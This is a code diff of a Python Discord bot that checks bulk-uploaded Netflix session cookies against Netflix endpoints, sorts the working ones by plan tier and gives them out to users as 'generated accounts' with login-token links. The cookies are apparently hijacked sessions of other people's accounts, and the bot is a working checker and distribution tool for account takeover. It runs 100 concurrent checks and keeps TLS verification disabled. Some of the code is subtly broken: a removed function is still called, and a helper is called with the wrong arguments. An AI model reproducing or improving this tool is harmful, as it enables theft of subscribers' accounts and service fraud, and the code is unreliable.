@@ -12,7 +12,6 @@ import warnings
 import zipfile
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timezone
-from urllib.parse import quote
 
 import discord
 import requests
@@ -24,6 +23,7 @@ from urllib3.exceptions import InsecureRequestWarning
 load_dotenv()
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+# Suppress discord.py 2.x SyntaxWarnings under Python 3.14+
 warnings.filterwarnings("ignore", category=SyntaxWarning, module=r"discord.*")
 warnings.filterwarnings("ignore", message=r".*message content intent.*", category=UserWarning)
 
@@ -32,6 +32,7 @@ warnings.filterwarnings("ignore", message=r".*message content intent.*", categor
 # ==========================================
 def _start_fake_server():
     port = int(os.environ.get("PORT", "10000"))
+
     class _Handler(http.server.BaseHTTPRequestHandler):
         def do_GET(self):
             body = b"OK"
@@ -40,13 +41,16 @@ def _start_fake_server():
             self.send_header("Content-Length", str(len(body)))
             self.end_headers()
             self.wfile.write(body)
+
         def do_HEAD(self):
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
             self.send_header("Content-Length", "2")
             self.end_headers()
+
         def log_message(self, *args):
             pass
+
     server = http.server.HTTPServer(("0.0.0.0", port), _Handler)
     t = threading.Thread(target=server.serve_forever, daemon=True)
     t.start()
@@ -55,7 +59,7 @@ def _start_fake_server():
 _start_fake_server()
 
 # ==========================================
-# CHANNEL IDs (set in .env)
+# CHANNEL IDs (set in .env or Replit Secrets)
 # ==========================================
 def _int_env(key: str) -> int:
     try:
@@ -63,14 +67,14 @@ def _int_env(key: str) -> int:
     except (ValueError, TypeError):
         return 0
 
-ADMIN_CHANNEL_ID = _int_env("ADMIN_CHANNEL_ID")
-FGEN_CHANNEL_ID  = _int_env("FGEN_CHANNEL_ID")
-BGEN_CHANNEL_ID  = _int_env("BGEN_CHANNEL_ID")
-PGEN_CHANNEL_ID  = _int_env("PGEN_CHANNEL_ID")
+ADMIN_CHANNEL_ID   = _int_env("ADMIN_CHANNEL_ID")
+FGEN_CHANNEL_ID    = _int_env("FGEN_CHANNEL_ID")
+BGEN_CHANNEL_ID    = _int_env("BGEN_CHANNEL_ID")
+PGEN_CHANNEL_ID    = _int_env("PGEN_CHANNEL_ID")
 RESTOCK_CHANNEL_ID = _int_env("RESTOCK_CHANNEL_ID")
-OWNER_ID         = int(os.environ.get("OWNER_ID", "1506365840273047714"))
-TICKET_CHANNEL_ID = 1516530741826289796
-VOUCH_CHANNEL_ID  = 1516530704148598944
+OWNER_ID           = int(os.environ.get("OWNER_ID", "1506365840273047714"))
+TICKET_CHANNEL_ID  = 1516530741826289796
+VOUCH_CHANNEL_ID   = 1516530704148598944
 
 # ==========================================
 # SUPABASE CLOUD DATABASE
@@ -150,7 +154,7 @@ class CloudDB:
         ids: set[str] = set()
         for tier in ("free", "booster", "premium"):
             for cookie_text in data["nf"].get(tier, []):
-                nid = _netscape_to_dict(cookie_text).get("NetflixId", "").strip()
+                nid = netscape_to_dict(cookie_text).get("NetflixId", "").strip()
                 if nid:
                     ids.add(nid)
         return ids
@@ -161,7 +165,7 @@ db = CloudDB(
 )
 
 # ==========================================
-# COOKIE UTILITIES (adapted from reference checker)
+# COOKIE PARSING (from reference checker)
 # ==========================================
 LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
 OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
@@ -184,7 +188,7 @@ def _decode(value) -> str | None:
             break
     return re.sub(r"\s+", " ", s).strip() or None
 
-def _netscape_to_dict(text: str) -> dict:
+def netscape_to_dict(text: str) -> dict:
     out: dict = {}
     for line in text.splitlines():
         line = line.strip()
@@ -383,7 +387,7 @@ def build_cookie_bundles_from_entries(entries):
             "index": bundle_index + 1,
             "total": bundle_count,
             "netscape_text": netscape_text,
-            "cookies": _netscape_to_dict(netscape_text),
+            "cookies": netscape_to_dict(netscape_text),
         })
     return bundles
 
@@ -394,14 +398,8 @@ def extract_netflix_cookie_bundles(content):
             return bundles
     return []
 
-def extract_netflix_cookie_text(content):
-    bundles = extract_netflix_cookie_bundles(content)
-    if not bundles:
-        return ""
-    return bundles[0]["netscape_text"]
-
 # ==========================================
-# NETFLIX COOKIE CHECKER (optimized, no global session)
+# NFToken helpers (shared)
 # ==========================================
 _NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 _NF_PARAMS = {
@@ -456,29 +454,97 @@ def _expiry_str(expires) -> str | None:
     except Exception:
         return str(expires)
 
-def normalize_plan_key(plan_name: str) -> str:
-    if not plan_name:
+def create_nftoken_fast(cookie_text: str) -> tuple[dict | None, str | None]:
+    nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
+    if not nid:
+        return None, "Missing NetflixId"
+    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
+    try:
+        r = requests.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
+                         timeout=10, verify=False)
+        if r.status_code != 200:
+            return None, f"NFToken HTTP {r.status_code}"
+        node = (((r.json().get("value") or {}).get("account") or {})
+                .get("token") or {}).get("default") or {}
+        token = _decode(node.get("token"))
+        if token:
+            return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None
+        return None, "Token field missing"
+    except Exception as e:
+        return None, str(e)
+
+# ==========================================
+# FAST CHECKER (for restocking – minimal)
+# ==========================================
+def check_nf_cookie_fast(cookie_text: str) -> dict:
+    """Returns dict: ok, plan, quality, country, reason (if not ok)"""
+    cookies = netscape_to_dict(cookie_text)
+    if "NetflixId" not in cookies:
+        return {"ok": False, "reason": "Missing NetflixId cookie."}
+
+    session = requests.Session()
+    session.cookies.clear()
+    session.cookies.update(cookies)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept-Encoding": "identity",
+    }
+    try:
+        r = session.get("https://www.netflix.com/account/membership",
+                        headers=headers, timeout=8, allow_redirects=True)
+    except requests.exceptions.Timeout:
+        return {"ok": False, "reason": "Request timed out."}
+    except Exception as e:
+        return {"ok": False, "reason": str(e)}
+
+    if r.status_code != 200:
+        return {"ok": False, "reason": f"HTTP {r.status_code}"}
+
+    text = r.text
+    def _rx_min(text, patterns):
+        for p in patterns:
+            m = re.search(p, text)
+            if m:
+                return _decode(m.group(1))
+        return None
+
+    plan = _rx_min(text,
+        r'"localizedPlanName"\s*:\s*"([^"]+)"',
+        r'"planName"\s*:\s*"([^"]+)"',
+        r'"name"\s*:\s*"([^"]+)"',
+    )
+    quality = _rx_min(text,
+        r'"videoQuality"\s*:\s*"([^"]+)"',
+        r'"quality"\s*:\s*"([^"]+)"',
+    )
+    country = _rx_min(text,
+        r'"currentCountry"\s*:\s*"([^"]+)"',
+        r'"countryOfSignup"\s*:\s*"([^"]+)"',
+    )
+    status = _rx_min(text, r'"membershipStatus"\s*:\s*"([^"]+)"')
+    if not status and not country:
+        if "/login" in r.url.lower() or "sign-in-form" in text.lower():
+            return {"ok": False, "reason": "Cookie expired (redirected to login)."}
+        return {"ok": False, "reason": "No active subscription"}
+
+    nft, nft_err = create_nftoken_fast(cookie_text)
+    if not nft:
+        return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
+
+    return {"ok": True, "plan": plan, "quality": quality, "country": country}
+
+# ==========================================
+# FULL CHECKER (for generation – all details)
+# ==========================================
+# (The following functions are directly from your original bot, kept for the DM embed)
+
+def normalize_plan_key(value: str | None) -> str:
+    if not value:
         return "unknown"
-    simplified = unicodedata.normalize("NFKD", plan_name)
+    simplified = unicodedata.normalize("NFKD", str(value))
     simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
     normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
     return normalized or "unknown"
-
-_PREMIUM_PLAN_KEYS = {"premium", "premium_extra_member", "extra_member_premium", "cao_cap", "ozel", "프리미엄", "プレミアム"}
-_BOOSTER_PLAN_KEYS = {"standard", "standard_with_ads", "estandar", "estandar_con_anuncios", "padrao", "standaard", "standardowy", "standardowy_z_reklamami", "standar", "standart", "スタンダード", "스탠다드"}
-
-def classify_tier(plan: str, quality: str) -> str:
-    key_p = normalize_plan_key(plan or "")
-    q_up  = (quality or "").upper()
-    if q_up in ("UHD", "4K") or "UHD" in q_up or "4K" in q_up:
-        return "premium"
-    if key_p in _PREMIUM_PLAN_KEYS or "premium" in key_p:
-        return "premium"
-    if key_p in _BOOSTER_PLAN_KEYS or "standard" in key_p:
-        return "booster"
-    if q_up == "HIGH" or "1080" in q_up or "FHD" in q_up:
-        return "booster"
-    return "free"
 
 def _rx(text: str, *patterns: str, flags: int = 0) -> str | None:
     for pat in patterns:
@@ -734,18 +800,19 @@ def _is_subscribed(info: dict) -> bool:
         return True
     if info.get("showExtraMemberSection") == "Yes":
         return True
-    raw = info.get("raw_text", "")
-    if any(re.search(p, raw, re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
+    if any(re.search(p, info.get("raw_text", ""), re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
         return True
     return False
 
-def check_nf_cookie(cookie_text: str) -> dict:
-    cookies = _netscape_to_dict(cookie_text)
+def check_nf_cookie_full(cookie_text: str) -> dict:
+    """Full detailed checker, returns the same dict as original bot."""
+    cookies = netscape_to_dict(cookie_text)
     if "NetflixId" not in cookies:
         return {"ok": False, "reason": "Missing NetflixId cookie."}
 
     session = requests.Session()
-    session.cookies.update(cookies)  # fresh session, no old cookies
+    session.cookies.clear()
+    session.cookies.update(cookies)
     headers = {
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -794,26 +861,8 @@ def check_nf_cookie(cookie_text: str) -> dict:
             "nft": nft,
             "full_info": info,
         }
-    return {"ok": False, "reason": f"No active subscription ({info.get('membershipStatus', 'unknown')})."}
 
-def create_nftoken_fast(cookie_text: str) -> tuple[dict | None, str | None]:
-    nid = _decode(_netscape_to_dict(cookie_text).get("NetflixId"))
-    if not nid:
-        return None, "Missing NetflixId"
-    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
-    try:
-        r = requests.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
-                         timeout=10, verify=False)
-        if r.status_code != 200:
-            return None, f"NFToken HTTP {r.status_code}"
-        node = (((r.json().get("value") or {}).get("account") or {})
-                .get("token") or {}).get("default") or {}
-        token = _decode(node.get("token"))
-        if token:
-            return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None
-        return None, "Token field missing"
-    except Exception as e:
-        return None, str(e)
+    return {"ok": False, "reason": f"No active subscription ({info.get('membershipStatus', 'unknown')})."}
 
 def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
     t = _decode(token)
@@ -837,12 +886,13 @@ def in_channel(channel_id: int):
         return True
     return app_commands.check(predicate)
 
-RESTOCK_IMAGE_URL = "https://kommodo.ai/i/o5Wj5QzQNV0CY3VEKAIR"   # replace with your actual image
+RESTOCK_IMAGE_URL = "https://kommodo.ai/i/tiDLkbEgU1zCoG3BF16m"   # <-- replace with your actual image
 
 class GeneratorCog(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
+    # ---------- GENERATION (uses FULL checker) ----------
     async def _generate(self, interaction: discord.Interaction,
                         tier: str, label: str, emoji: str) -> None:
         await interaction.response.defer(ephemeral=True)
@@ -857,10 +907,10 @@ class GeneratorCog(commands.Cog):
                 )
                 return
 
-            check = await loop.run_in_executor(None, check_nf_cookie, cookie)
+            check = await loop.run_in_executor(None, check_nf_cookie_full, cookie)
             if not check["ok"]:
                 if "NFToken" in check.get("reason", ""):
-                    # Cookie is valid but NFToken failed -> push back
+                    # Valid cookie but NFToken failed -> push back
                     await loop.run_in_executor(None, db.push_cookies, tier, [cookie])
                     await interaction.followup.send(
                         f"❌ Something went wrong while generating your account. "
@@ -868,7 +918,7 @@ class GeneratorCog(commands.Cog):
                         ephemeral=True,
                     )
                     continue
-                print(f"[Gen] Dead {tier} cookie (attempt {attempt+1}): {check.get('reason')}")
+                # Dead cookie – discard
                 continue
 
             nft = check.get("nft")
@@ -876,10 +926,8 @@ class GeneratorCog(commands.Cog):
                 continue
 
             full_info = check.get("full_info", {})
-
             if str(full_info.get("holdStatus", "")).strip().lower() == "yes":
-                print(f"[Gen] Skipping on-hold {tier} cookie (attempt {attempt+1})")
-                # On-hold cookies are discarded (not pushed back)
+                # On-hold – discard
                 continue
 
             links = build_links_for_tier(nft["token"], tier)
@@ -940,7 +988,7 @@ class GeneratorCog(commands.Cog):
                 dm_success = False
 
             if not dm_success:
-                # DM failed → push cookie back so it's not wasted
+                # Push cookie back because DM failed
                 await loop.run_in_executor(None, db.push_cookies, tier, [cookie])
                 await interaction.followup.send(
                     "❌ I couldn't send you a DM. Please enable DMs and try again.",
@@ -973,7 +1021,6 @@ class GeneratorCog(commands.Cog):
             ephemeral=True,
         )
 
-    # GEN COMMANDS: channel check BEFORE cooldown
     @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
     @in_channel(FGEN_CHANNEL_ID)
     @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
@@ -992,16 +1039,22 @@ class GeneratorCog(commands.Cog):
     async def pgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "premium", "Premium", "💎")
 
-    # ---------- RESTOCK WITH PROGRESS BAR EMBED ----------
-    @app_commands.command(name="restock", description="[ADMIN] Upload up to 5 files (.txt/.json/.zip) — auto-extracted, checked & sorted")
+    # ---------- RESTOCK (uses FAST checker) ----------
+    @app_commands.command(
+        name="restock",
+        description="[ADMIN] Upload up to 5 files (.txt/.json/.zip) — auto-extracted, checked & sorted"
+    )
     @app_commands.checks.has_permissions(administrator=True)
     @in_channel(ADMIN_CHANNEL_ID)
-    async def restock(self, interaction: discord.Interaction,
-                      file1: discord.Attachment,
-                      file2: discord.Attachment | None = None,
-                      file3: discord.Attachment | None = None,
-                      file4: discord.Attachment | None = None,
-                      file5: discord.Attachment | None = None):
+    async def restock(
+        self,
+        interaction: discord.Interaction,
+        file1: discord.Attachment,
+        file2: discord.Attachment | None = None,
+        file3: discord.Attachment | None = None,
+        file4: discord.Attachment | None = None,
+        file5: discord.Attachment | None = None,
+    ):
         await interaction.response.defer(ephemeral=True)
 
         attachments = [f for f in (file1, file2, file3, file4, file5) if f is not None]
@@ -1013,7 +1066,7 @@ class GeneratorCog(commands.Cog):
                 ephemeral=True,
             )
 
-        all_bundles = []   # list of (filename, bundle dict)
+        all_bundles = []
         file_names = []
         for att in attachments:
             try:
@@ -1048,11 +1101,12 @@ class GeneratorCog(commands.Cog):
         if not all_bundles:
             return await interaction.followup.send("❌ No valid Netflix accounts found.", ephemeral=True)
 
-        # Deduplication and pre-fetch existing DB
         loop = asyncio.get_running_loop()
+
+        # Deduplication
         existing_ids = await loop.run_in_executor(None, db.existing_netflix_ids)
         seen_ids = set(existing_ids)
-        unique_cookies = []  # list of (netscape_text, filename)
+        unique_cookies = []
         dupes = 0
         for fname, bundle in all_bundles:
             nid = bundle["cookies"].get("NetflixId", "").strip()
@@ -1067,7 +1121,6 @@ class GeneratorCog(commands.Cog):
         if total == 0:
             return await interaction.followup.send("❌ All accounts were duplicates.", ephemeral=True)
 
-        # Progress embed
         progress_embed = discord.Embed(
             title="⏳ Restocking Netflix Accounts",
             description=f"Scanned: 0/{total}\n[{'░'*20}] 0%",
@@ -1076,8 +1129,8 @@ class GeneratorCog(commands.Cog):
         progress_embed.set_footer(text="Please wait…")
         progress_msg = await interaction.followup.send(embed=progress_embed, ephemeral=True)
 
-        MAX_WORKERS = 50
-        SEM_LIMIT = 50
+        MAX_WORKERS = 100
+        SEM_LIMIT = 100
         executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
         sem = asyncio.Semaphore(SEM_LIMIT)
         completed = 0
@@ -1086,7 +1139,7 @@ class GeneratorCog(commands.Cog):
         async def _check(cookie_text, fname):
             nonlocal completed
             async with sem:
-                result = await loop.run_in_executor(executor, check_nf_cookie, cookie_text)
+                res = await loop.run_in_executor(executor, check_nf_cookie_fast, cookie_text)
             async with lock:
                 nonlocal completed
                 completed += 1
@@ -1100,26 +1153,20 @@ class GeneratorCog(commands.Cog):
                     )
                     new_embed.set_footer(text="Please wait…")
                     await progress_msg.edit(embed=new_embed)
-            return result
+            return res
 
         results = await asyncio.gather(*[_check(cookie, fname) for cookie, fname in unique_cookies])
         executor.shutdown(wait=False)
 
         sorted_cookies = {"free": [], "booster": [], "premium": []}
         dead = 0
-        on_hold = 0
         for (cookie_text, _), res in zip(unique_cookies, results):
             if res["ok"]:
-                full_info = res.get("full_info", {})
-                if str(full_info.get("holdStatus", "")).strip().lower() == "yes":
-                    on_hold += 1
-                    continue
-                tier = classify_tier(res.get("plan", ""), res.get("quality", ""))
+                tier = classify_tier(res.get("plan"), res.get("quality"))
                 sorted_cookies[tier].append(cookie_text)
             else:
                 dead += 1
 
-        # Save to DB (using one atomic update)
         data = await loop.run_in_executor(None, db.get_all)
         for t in ("free", "booster", "premium"):
             data["nf"][t].extend(sorted_cookies[t])
@@ -1140,7 +1187,6 @@ class GeneratorCog(commands.Cog):
         admin_embed.add_field(name="🆓 Free Added", value=f"`{len(sorted_cookies['free'])}`", inline=True)
         admin_embed.add_field(name="💀 Dead Filtered", value=f"`{dead}`", inline=True)
         admin_embed.add_field(name="♻️ Duplicates Skipped", value=f"`{dupes}`", inline=True)
-        admin_embed.add_field(name="⏸️ On Hold Skipped", value=f"`{on_hold}`", inline=True)
         admin_embed.add_field(name="📊 Total Scanned", value=f"`{len(all_bundles)}`", inline=True)
         admin_embed.add_field(name="👤 Restocked by", value=interaction.user.mention, inline=False)
         if not save_ok:
@@ -1148,7 +1194,6 @@ class GeneratorCog(commands.Cog):
 
         await progress_msg.edit(content=None, embed=admin_embed)
 
-        # Public restock channel embed
         restock_channel = self.bot.get_channel(RESTOCK_CHANNEL_ID)
         if restock_channel:
             pub_embed = discord.Embed(
@@ -1169,7 +1214,6 @@ class GeneratorCog(commands.Cog):
             pub_embed.add_field(name="✅ Valid Added", value=f"`{sum(len(v) for v in sorted_cookies.values())}`", inline=True)
             pub_embed.add_field(name="💀 Dead", value=f"`{dead}`", inline=True)
             pub_embed.add_field(name="♻️ Dupes", value=f"`{dupes}`", inline=True)
-            pub_embed.add_field(name="⏸️ On Hold", value=f"`{on_hold}`", inline=True)
             pub_embed.set_footer(text="⚠️ All Accounts Working With No Errors")
             pub_embed.set_image(url=RESTOCK_IMAGE_URL)
             try:
@@ -1219,7 +1263,7 @@ class GeneratorCog(commands.Cog):
         for tier in ("free", "booster", "premium"):
             new_list = []
             for ct in data["nf"][tier]:
-                nid = _netscape_to_dict(ct).get("NetflixId", "").strip()
+                nid = netscape_to_dict(ct).get("NetflixId", "").strip()
                 if nid in ids_to_remove:
                     removed += 1
                 else:
